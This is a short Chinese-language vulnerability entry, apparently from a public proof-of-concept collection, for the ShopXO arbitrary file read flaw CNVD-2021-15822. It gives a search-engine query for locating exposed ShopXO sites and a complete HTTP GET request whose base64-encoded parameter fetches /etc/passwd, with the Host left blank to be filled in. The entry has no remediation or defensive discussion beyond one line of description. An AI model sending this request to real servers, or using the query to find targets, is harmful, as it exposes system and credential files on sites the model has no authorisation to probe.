# ShopXO 任意文件读取漏洞CNVD-2021-15822

## 漏洞描述

ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。

参考链接：

- https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822

## 网络测绘

```
app="ShopXO企业级B2C电商系统提供商"
```

## 漏洞复现

poc：

```
GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

